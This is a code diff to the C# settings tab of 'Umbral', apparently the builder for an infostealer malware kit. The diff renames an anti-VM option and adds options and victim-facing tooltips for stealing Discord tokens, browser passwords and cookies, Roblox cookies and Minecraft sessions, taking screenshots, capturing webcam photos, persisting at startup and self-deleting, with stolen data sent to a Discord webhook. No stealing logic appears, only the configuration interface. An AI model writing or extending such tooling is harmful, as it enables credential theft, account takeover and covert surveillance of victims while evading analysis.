@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Drawing;
 using System.Net.Http;
-using System.Runtime.CompilerServices;
 using System.Windows.Forms;
 
 namespace Umbral.builder.User_Controls
@@ -13,7 +12,7 @@ namespace Umbral.builder.User_Controls
         public static string Webhook;
 
         public static bool Ping;
-        public static bool VmProtect;
+        public static bool AntiVm;
         public static bool Startup;
         public static bool StealTokens;
         public static bool StealPasswords;
@@ -21,6 +20,8 @@ namespace Umbral.builder.User_Controls
         public static bool StealRobloxCookies;
         public static bool StealMinecraftSession;
         public static bool TakeScreenshot;
+        public static bool SelfDestruct;
+        public static bool CaptureWebcam;
 
         private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
         private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
@@ -29,6 +30,21 @@ namespace Umbral.builder.User_Controls
         public GeneralTab()
         {
             InitializeComponent();
+            ToolTip tooltip = new ToolTip();
+            tooltip.SetToolTip(WebhookCheckButton, "Checks if webhook is working or not.");
+
+            tooltip.SetToolTip(PingCheckBox, "Pings @everyone when sending victim's info.");
+            tooltip.SetToolTip(AntiVmCheckBox, "Prevents the stub from running in a virtual machine.");
+            tooltip.SetToolTip(StartupCheckBox, "Launches the stub on windows startup.");
+
+            tooltip.SetToolTip(StealTokensCheckBox, "Steals Discord tokens.");
+            tooltip.SetToolTip(StealPasswordsCheckBox, "Steals passwords from browsers.");
+            tooltip.SetToolTip(StealCookiesCheckBox, "Steals cookies from browsers.");
+            tooltip.SetToolTip(StealRobloxCookiesCheckBox, "Steals Roblox cookies.");
+            tooltip.SetToolTip(StealMinecraftSessionCheckBox, "Steals Minecraft session file.");
+            tooltip.SetToolTip(TakeScreenshotCheckBox, "Takes screenshot of the victim's machine.");
+            tooltip.SetToolTip(SelfDestructCheckBox, "Deletes the stub when ran.");
+            tooltip.SetToolTip(CaptureWebcamCheckBox, "Captures photos from victim's webcam.");
         }
 
         private void webhookLabel_Leave(object sender, EventArgs e)
@@ -109,8 +125,8 @@ namespace Umbral.builder.User_Controls
                 Ping = checkBox.Checked;
             else if (checkBox.Equals(StartupCheckBox))
                 Startup = checkBox.Checked;
-            else if (checkBox.Equals(VmProtectCheckBox))
-                VmProtect = checkBox.Checked;
+            else if (checkBox.Equals(AntiVmCheckBox))
+                AntiVm = checkBox.Checked;
             else if (checkBox.Equals(StealTokensCheckBox))
                 StealTokens = checkBox.Checked;
             else if (checkBox.Equals(StealPasswordsCheckBox))
@@ -123,6 +139,10 @@ namespace Umbral.builder.User_Controls
                 StealMinecraftSession = checkBox.Checked;
             else if (checkBox.Equals(TakeScreenshotCheckBox))
                 TakeScreenshot = checkBox.Checked;
+            else if (checkBox.Equals(SelfDestructCheckBox))
+                SelfDestruct = checkBox.Checked;
+            else if (checkBox.Equals(CaptureWebcamCheckBox))
+                CaptureWebcam = checkBox.Checked;
         }
 
         private void webhookLabel_TextChanged(object sender, EventArgs e)
